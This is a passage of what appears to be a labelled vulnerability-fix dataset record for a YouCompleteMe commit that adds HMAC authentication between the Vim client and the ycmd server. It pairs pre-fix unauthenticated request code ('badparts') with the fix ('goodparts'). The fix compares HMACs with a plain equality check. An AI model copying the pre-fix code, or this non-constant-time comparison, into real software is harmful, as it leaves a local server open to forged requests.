info from server'\n    debug_info += '\\nServer running at: {0}'.format(\n        BaseRequest.server_location )\n    debug_info += '\\nServer process ID: {0}'.format( self._server_popen.pid )\n    if self._server_stderr or self._server_stdout:\n      debug_info += '\\nServer logfiles:\\n  {0}\\n  {1}'.format(\n        self._server_stdout,\n        self._server_stderr )\n\n    return debug_info\n\n\n  def CurrentFiletypeCompletionEnabled( self ):\n    filetypes = vimsupport.CurrentFiletypes()\n    filetype_to_disable = self._user_options[\n      'filetype_specific_completion_to_disable' ]\n    return not all([ x in filetype_to_disable for x in filetypes ])\n\n\n  def _AddSyntaxDataIfNeeded( self, extra_data ):\n    if not self._user_options[ 'seed_identifiers_with_syntax' ]:\n      return\n    filetype = vimsupport.CurrentFiletypes()[ 0 ]\n    if filetype in self._filetypes_with_keywords_loaded:\n      return\n\n    self._filetypes_with_keywords_loaded.add( filetype )\n    extra_data[ 'syntax_keywords' ] = list(\n       syntax_parse.SyntaxKeywordsForCurrentBuffer() )\n\n\n  def _AddTagsFilesIfNeeded( self, extra_data ):\n    def GetTagFiles():\n      tag_files = vim.eval( 'tagfiles()' )\n      current_working_directory = os.getcwd()\n      return [ os.path.join( current_working_directory, x ) for x in tag_files ]\n\n    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:\n      return\n    extra_data[ 'tag_files' ] = GetTagFiles()\n\n\n  def _AddExtraConfDataIfNeeded( self, extra_data ):\n    def BuildExtraConfData( extra_conf_vim_data ):\n      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )\n                   for expr in extra_conf_vim_data )\n\n    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]\n    if extra_conf_vim_data:\n      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(\n        extra_conf_vim_data )\n\n\ndef _PathToServerScript():\n  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )\n  return os.path.join( dir_of_current_script, 'server\/ycmd.py' )\n\n\ndef _AddUltiSnipsDataIfNeeded( extra_data ):\n  if not USE_ULTISNIPS_DATA:\n    return\n\n  try:\n    rawsnips = UltiSnips_Manager._snips( '', 1 )\n  except:\n    return\n\n  # UltiSnips_Manager._snips() returns a class instance where:\n  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )\n  # class.description - description of the snippet\n  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,\n                                           'description': x.description\n                                         } for x in rawsnips ]\n\n\n"}},"msg":"Client\/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution."}},"https:\/\/github.com\/ssafa\/YouCompleteME":{"e965e0284789e610c0a50d20a92a82ec5c135064":{"url":"https:\/\/api.github.com\/repos\/ssafa\/YouCompleteME\/commits\/e965e0284789e610c0a50d20a92a82ec5c135064","html_url":"https:\/\/github.com\/ssafa\/YouCompleteME\/commit\/e965e0284789e610c0a50d20a92a82ec5c135064","message":"Client\/server communication now uses HMAC for auth\n\nThis is to prevent a convoluted exploit that can trigger remote code execution.","sha":"e965e0284789e610c0a50d20a92a82ec5c135064","keyword":"remote code execution prevent","diff":"diff --git a\/python\/ycm\/client\/base_request.py b\/python\/ycm\/client\/base_request.py\nindex 7f609727..c9c417f4 100644\n--- a\/python\/ycm\/client\/base_request.py\n+++ b\/python\/ycm\/client\/base_request.py\n@@ -24,6 +24,7 @@\n from requests_futures.sessions import FuturesSession\n from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\n from ycm import vimsupport\n+from ycm import utils\n from ycm.utils import ToUtf8Json\n from ycm.server.responses import ServerError, UnknownExtraConf\n \n@@ -31,6 +32,7 @@\n _EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n # Setting this to None seems to screw up the Requests\/urllib3 libs.\n _DEFAULT_TIMEOUT_SEC = 30\n+_HMAC_HEADER = 'x-ycm-hmac'\n \n class BaseRequest( object ):\n   def __init__( self ):\n@@ -88,24 +90,28 @@ def _TalkToHandlerAsync( data,\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n@@ -113,8 +119,18 @@ def DelayedSendRequest( data, handler, method ):\n     return SendRequest( data, handler, method, timeout )\n \n \n+  @staticmethod\n+  def _ExtraHeaders( request_body = None ):\n+    if not request_body:\n+      request_body = ''\n+    headers = dict( _HEADERS )\n+    headers[ _HMAC_HEADER ] = utils.CreateHexHmac( request_body,\n+                                                   BaseRequest.hmac_secret )\n+    return headers\n+\n   session = FuturesSession( executor = _EXECUTOR )\n   server_location = 'http:\/\/localhost:6666'\n+  hmac_secret = ''\n \n \n def BuildRequestData( start_column = None,\n@@ -141,6 +157,7 @@ def BuildRequestData( start_column = None,\n \n def JsonFromFuture( future ):\n   response = future.result()\n+  _ValidateResponseObject( response )\n   if response.status_code == requests.codes.server_error:\n     _RaiseExceptionForData( response.json() )\n \n@@ -153,6 +170,13 @@ def JsonFromFuture( future ):\n   return None\n \n \n+def _ValidateResponseObject( response ):\n+  if not utils.ContentHexHmacValid( response.content,\n+                                    response.headers[ _HMAC_HEADER ],\n+                                    BaseRequest.hmac_secret ):\n+    raise RuntimeError( 'Received invalid HMAC for response!' )\n+  return True\n+\n def _BuildUri( handler ):\n   return urlparse.urljoin( BaseRequest.server_location, handler )\n \n@@ -163,7 +187,9 @@ def _CheckServerIsHealthyWithCache():\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n \ndiff --git a\/python\/ycm\/server\/hmac_plugin.py b\/python\/ycm\/server\/hmac_plugin.py\nnew file mode 100644\nindex 00000000..b433b2b0\n--- \/dev\/null\n+++ b\/python\/ycm\/server\/hmac_plugin.py\n@@ -0,0 +1,57 @@\n+#!\/usr\/bin\/env python\n+#\n+# Copyright (C) 2014  Google Inc.\n+#\n+# This file is part of YouCompleteMe.\n+#\n+# YouCompleteMe is free software: you can redistribute it and\/or modify\n+# it under the terms of the GNU General Public License as published by\n+# the Free Software Foundation, either version 3 of the License, or\n+# (at your option) any later version.\n+#\n+# YouCompleteMe is distributed in the hope that it will be useful,\n+# but WITHOUT ANY WARRANTY; without even the implied warranty of\n+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+# GNU General Public License for more details.\n+#\n+# You should have received a copy of the GNU General Public License\n+# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n+\n+import logging\n+import httplib\n+from bottle import request, response, abort\n+from ycm import utils\n+\n+_HMAC_HEADER = 'x-ycm-hmac'\n+\n+# This class implements the Bottle plugin API:\n+# http:\/\/bottlepy.org\/docs\/dev\/plugindev.html\n+#\n+# We want to ensure that every request coming in has a valid HMAC set in the\n+# x-ycm-hmac header and that every response coming out sets such a valid header.\n+# This is to prevent security issues with possible remote code execution.\n+class HmacPlugin( object ):\n+  name = 'hmac'\n+  api = 2\n+\n+\n+  def __init__( self, hmac_secret ):\n+    self._hmac_secret = hmac_secret\n+    self._logger = logging.getLogger( __name__ )\n+\n+\n+  def __call__( self, callback ):\n+    def wrapper( *args, **kwargs ):\n+      body = request.body.read()\n+      if not utils.ContentHexHmacValid( body,\n+                                        request.headers[ _HMAC_HEADER ],\n+                                        self._hmac_secret ):\n+        self._logger.info( 'Dropping request with bad HMAC.' )\n+        abort( httplib.UNAUTHORIZED, 'Unauthorized, received bad HMAC.')\n+        return\n+      body = callback( *args, **kwargs )\n+      response.headers[ _HMAC_HEADER ] = utils.CreateHexHmac(\n+          body, self._hmac_secret )\n+      return body\n+    return wrapper\n+\ndiff --git a\/python\/ycm\/server\/ycmd.py b\/python\/ycm\/server\/ycmd.py\nindex 34e66172..64b0f07f 100755\n--- a\/python\/ycm\/server\/ycmd.py\n+++ b\/python\/ycm\/server\/ycmd.py\n@@ -27,10 +27,12 @@\n import waitress\n import signal\n import os\n+import base64\n from ycm import user_options_store\n from ycm import extra_conf_store\n from ycm import utils\n from ycm.server.watchdog_plugin import WatchdogPlugin\n+from ycm.server.hmac_plugin import HmacPlugin\n \n def YcmCoreSanityCheck():\n   if 'ycm_core' in sys.modules:\n@@ -103,6 +105,8 @@ def Main():\n   options = ( json.load( open( args.options_file, 'r' ) )\n               if args.options_file\n               else user_options_store.DefaultOptions() )\n+  utils.RemoveIfExists( args.options_file )\n+  hmac_secret = base64.b64decode( options[ 'hmac_secret' ] )\n   user_options_store.SetAll( options )\n \n   # This ensures that ycm_core is not loaded before extra conf\n@@ -126,6 +130,7 @@ def Main():\n   handlers.UpdateUserOptions( options )\n   SetUpSignalHandler(args.stdout, args.stderr, args.keep_logfiles)\n   handlers.app.install( WatchdogPlugin( args.idle_suicide_seconds ) )\n+  handlers.app.install( HmacPlugin( hmac_secret ) )\n   waitress.serve( handlers.app,\n                   host = args.host,\n                   port = args.port,\ndiff --git a\/python\/ycm\/utils.py b\/python\/ycm\/utils.py\nindex d9128716..095337c9 100644\n--- a\/python\/ycm\/utils.py\n+++ b\/python\/ycm\/utils.py\n@@ -25,6 +25,8 @@\n import socket\n import stat\n import json\n+import hmac\n+import hashlib\n from distutils.spawn import find_executable\n import subprocess\n import collections\n@@ -212,3 +214,11 @@ def SafePopen( *args, **kwargs ):\n   return subprocess.Popen( *args, **kwargs )\n \n \n+def ContentHexHmacValid( content, hmac, hmac_secret ):\n+  return hmac == CreateHexHmac( content, hmac_secret )\n+\n+\n+def CreateHexHmac( content, hmac_secret ):\n+  return hmac.new( hmac_secret,\n+                   msg = content,\n+                   digestmod = hashlib.sha256 ).hexdigest()\ndiff --git a\/python\/ycm\/youcompleteme.py b\/python\/ycm\/youcompleteme.py\nindex 448236eb..83849ce1 100644\n--- a\/python\/ycm\/youcompleteme.py\n+++ b\/python\/ycm\/youcompleteme.py\n@@ -22,6 +22,7 @@\n import tempfile\n import json\n import signal\n+import base64\n from subprocess import PIPE\n from ycm import vimsupport\n from ycm import utils\n@@ -58,6 +59,7 @@\n # Ctrl-C in Vim.\n signal.signal( signal.SIGINT, signal.SIG_IGN )\n \n+HMAC_SECRET_LENGTH = 16\n NUM_YCMD_STDERR_LINES_ON_CRASH = 30\n SERVER_CRASH_MESSAGE_STDERR_FILE = (\n   'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n@@ -80,16 +82,18 @@ def __init__( self, user_options ):\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n@@ -116,6 +120,7 @@ def _SetupServer( self ):\n \n       self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n       BaseRequest.server_location = 'http:\/\/localhost:' + str( server_port )\n+      BaseRequest.hmac_secret = hmac_secret\n \n     self._NotifyUserIfServerCrashed()\n \n@@ -148,7 +153,6 @@ def ServerPid( self ):\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","files":{"\/python\/ycm\/client\/base_request.py":{"changes":[{"diff":"\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n","add":14,"remove":10,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["        return BaseRequest.session.post( _BuildUri( handler ),","                                        data = ToUtf8Json( data ),","                                        headers = _HEADERS,","                                        timeout = timeout )","        return BaseRequest.session.get( _BuildUri( handler ),","                                        headers = _HEADERS,","                                        timeout = timeout )","                              data = ToUtf8Json( data ),","                              headers = _HEADERS )","                             headers = _HEADERS )"],"goodparts":["        sent_data = ToUtf8Json( data )","        return BaseRequest.session.post(","            _BuildUri( handler ),","            data = sent_data,","            headers = BaseRequest._ExtraHeaders( sent_data ),","            timeout = timeout )","        return BaseRequest.session.get(","            _BuildUri( handler ),","            headers = BaseRequest._ExtraHeaders(),","            timeout = timeout )","        sent_data = ToUtf8Json( data )","                              data = sent_data,","                              headers = BaseRequest._ExtraHeaders( sent_data ) )","                             headers = BaseRequest._ExtraHeaders() )"]},{"diff":"\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ","add":3,"remove":1,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["    response = requests.get( _BuildUri( 'healthy' ) )"],"goodparts":["    response = requests.get( _BuildUri( 'healthy' ),","                             headers = BaseRequest._ExtraHeaders() )","    _ValidateResponseObject( response )"]},{"diff":"\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n","add":14,"remove":10,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["        return BaseRequest.session.post( _BuildUri( handler ),","                                        data = ToUtf8Json( data ),","                                        headers = _HEADERS,","                                        timeout = timeout )","        return BaseRequest.session.get( _BuildUri( handler ),","                                        headers = _HEADERS,","                                        timeout = timeout )","                              data = ToUtf8Json( data ),","                              headers = _HEADERS )","                             headers = _HEADERS )"],"goodparts":["        sent_data = ToUtf8Json( data )","        return BaseRequest.session.post(","            _BuildUri( handler ),","            data = sent_data,","            headers = BaseRequest._ExtraHeaders( sent_data ),","            timeout = timeout )","        return BaseRequest.session.get(","            _BuildUri( handler ),","            headers = BaseRequest._ExtraHeaders(),","            timeout = timeout )","        sent_data = ToUtf8Json( data )","                              data = sent_data,","                              headers = BaseRequest._ExtraHeaders( sent_data ) )","                             headers = BaseRequest._ExtraHeaders() )"]},{"diff":"\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ","add":3,"remove":1,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["    response = requests.get( _BuildUri( 'healthy' ) )"],"goodparts":["    response = requests.get( _BuildUri( 'healthy' ),","                             headers = BaseRequest._ExtraHeaders() )","    _ValidateResponseObject( response )"]}],"source":"\n import vim import requests import urlparse from retries import retries from requests_futures.sessions import FuturesSession from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor from ycm import vimsupport from ycm.utils import ToUtf8Json from ycm.server.responses import ServerError, UnknownExtraConf _HEADERS={'content-type': 'application\/json'} _EXECUTOR=UnsafeThreadPoolExecutor( max_workers=30) _DEFAULT_TIMEOUT_SEC=30 class BaseRequest( object): def __init__( self): pass def Start( self): pass def Done( self): return True def Response( self): return{} @staticmethod def GetDataFromHandler( handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '', handler, 'GET', timeout)) @staticmethod def PostDataToHandler( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data, handler, timeout)) @staticmethod def PostDataToHandlerAsync( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout) @staticmethod def _TalkToHandlerAsync( data, handler, method, timeout=_DEFAULT_TIMEOUT_SEC): def SendRequest( data, handler, method, timeout): if method=='POST': return BaseRequest.session.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS, timeout=timeout) if method=='GET': return BaseRequest.session.get( _BuildUri( handler), headers=_HEADERS, timeout=timeout) @retries( 5, delay=0.5, backoff=1.5) def DelayedSendRequest( data, handler, method): if method=='POST': return requests.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS) if method=='GET': return requests.get( _BuildUri( handler), headers=_HEADERS) if not _CheckServerIsHealthyWithCache(): return _EXECUTOR.submit( DelayedSendRequest, data, handler, method) return SendRequest( data, handler, method, timeout) session=FuturesSession( executor=_EXECUTOR) server_location='http:\/\/localhost:6666' def BuildRequestData( start_column=None, query=None, include_buffer_data=True): line, column=vimsupport.CurrentLineAndColumn() filepath=vimsupport.GetCurrentBufferFilepath() request_data={ 'filetypes': vimsupport.CurrentFiletypes(), 'line_num': line, 'column_num': column, 'start_column': start_column, 'line_value': vim.current.line, 'filepath': filepath } if include_buffer_data: request_data[ 'file_data']=vimsupport.GetUnsavedAndCurrentBufferData() if query: request_data[ 'query']=query return request_data def JsonFromFuture( future): response=future.result() if response.status_code==requests.codes.server_error: _RaiseExceptionForData( response.json()) response.raise_for_status() if response.text: return response.json() return None def _BuildUri( handler): return urlparse.urljoin( BaseRequest.server_location, handler) SERVER_HEALTHY=False def _CheckServerIsHealthyWithCache(): global SERVER_HEALTHY def _ServerIsHealthy(): response=requests.get( _BuildUri( 'healthy')) response.raise_for_status() return response.json() if SERVER_HEALTHY: return True try: SERVER_HEALTHY=_ServerIsHealthy() return SERVER_HEALTHY except: return False def _RaiseExceptionForData( data): if data[ 'exception'][ 'TYPE']==UnknownExtraConf.__name__: raise UnknownExtraConf( data[ 'exception'][ 'extra_conf_file']) raise ServerError( '{0}:{1}'.format( data[ 'exception'][ 'TYPE'], data[ 'message'])) ","sourceWithComments":"#!\/usr\/bin\/env python\n#\n# Copyright (C) 2013  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and\/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nimport vim\nimport requests\nimport urlparse\nfrom retries import retries\nfrom requests_futures.sessions import FuturesSession\nfrom ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\nfrom ycm import vimsupport\nfrom ycm.utils import ToUtf8Json\nfrom ycm.server.responses import ServerError, UnknownExtraConf\n\n_HEADERS = {'content-type': 'application\/json'}\n_EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n# Setting this to None seems to screw up the Requests\/urllib3 libs.\n_DEFAULT_TIMEOUT_SEC = 30\n\nclass BaseRequest( object ):\n  def __init__( self ):\n    pass\n\n\n  def Start( self ):\n    pass\n\n\n  def Done( self ):\n    return True\n\n\n  def Response( self ):\n    return {}\n\n  # This method blocks\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def GetDataFromHandler( handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '',\n                                                            handler,\n                                                            'GET',\n                                                            timeout ) )\n\n\n  # This is the blocking version of the method. See below for async.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandler( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data,\n                                                               handler,\n                                                               timeout ) )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandlerAsync( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |method| is either 'POST' or 'GET'.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def _TalkToHandlerAsync( data,\n                           handler,\n                           method,\n                           timeout = _DEFAULT_TIMEOUT_SEC ):\n    def SendRequest( data, handler, method, timeout ):\n      if method == 'POST':\n        return BaseRequest.session.post( _BuildUri( handler ),\n                                        data = ToUtf8Json( data ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n      if method == 'GET':\n        return BaseRequest.session.get( _BuildUri( handler ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n\n    @retries( 5, delay = 0.5, backoff = 1.5 )\n    def DelayedSendRequest( data, handler, method ):\n      if method == 'POST':\n        return requests.post( _BuildUri( handler ),\n                              data = ToUtf8Json( data ),\n                              headers = _HEADERS )\n      if method == 'GET':\n        return requests.get( _BuildUri( handler ),\n                             headers = _HEADERS )\n\n    if not _CheckServerIsHealthyWithCache():\n      return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n\n    return SendRequest( data, handler, method, timeout )\n\n\n  session = FuturesSession( executor = _EXECUTOR )\n  server_location = 'http:\/\/localhost:6666'\n\n\ndef BuildRequestData( start_column = None,\n                      query = None,\n                      include_buffer_data = True ):\n  line, column = vimsupport.CurrentLineAndColumn()\n  filepath = vimsupport.GetCurrentBufferFilepath()\n  request_data = {\n    'filetypes': vimsupport.CurrentFiletypes(),\n    'line_num': line,\n    'column_num': column,\n    'start_column': start_column,\n    'line_value': vim.current.line,\n    'filepath': filepath\n  }\n\n  if include_buffer_data:\n    request_data[ 'file_data' ] = vimsupport.GetUnsavedAndCurrentBufferData()\n  if query:\n    request_data[ 'query' ] = query\n\n  return request_data\n\n\ndef JsonFromFuture( future ):\n  response = future.result()\n  if response.status_code == requests.codes.server_error:\n    _RaiseExceptionForData( response.json() )\n\n  # We let Requests handle the other status types, we only handle the 500\n  # error code.\n  response.raise_for_status()\n\n  if response.text:\n    return response.json()\n  return None\n\n\ndef _BuildUri( handler ):\n  return urlparse.urljoin( BaseRequest.server_location, handler )\n\n\nSERVER_HEALTHY = False\n\ndef _CheckServerIsHealthyWithCache():\n  global SERVER_HEALTHY\n\n  def _ServerIsHealthy():\n    response = requests.get( _BuildUri( 'healthy' ) )\n    response.raise_for_status()\n    return response.json()\n\n  if SERVER_HEALTHY:\n    return True\n\n  try:\n    SERVER_HEALTHY = _ServerIsHealthy()\n    return SERVER_HEALTHY\n  except:\n    return False\n\n\ndef _RaiseExceptionForData( data ):\n  if data[ 'exception' ][ 'TYPE' ] == UnknownExtraConf.__name__:\n    raise UnknownExtraConf( data[ 'exception' ][ 'extra_conf_file' ] )\n\n  raise ServerError( '{0}: {1}'.format( data[ 'exception' ][ 'TYPE' ],\n                                        data[ 'message' ] ) )\n"},"\/python\/ycm\/youcompleteme.py":{"changes":[{"diff":"\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n","add":5,"remove":3,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    self._temp_options_filename = None","      self._temp_options_filename = options_file.name","      json.dump( dict( self._user_options ), options_file )"],"goodparts":["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )","      options_dict = dict( self._user_options )","      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )","      json.dump( options_dict, options_file )"]},{"diff":"\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","add":0,"remove":1,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    utils.RemoveIfExists( self._temp_options_filename )"],"goodparts":[]},{"diff":"\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n","add":5,"remove":3,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    self._temp_options_filename = None","      self._temp_options_filename = options_file.name","      json.dump( dict( self._user_options ), options_file )"],"goodparts":["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )","      options_dict = dict( self._user_options )","      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret 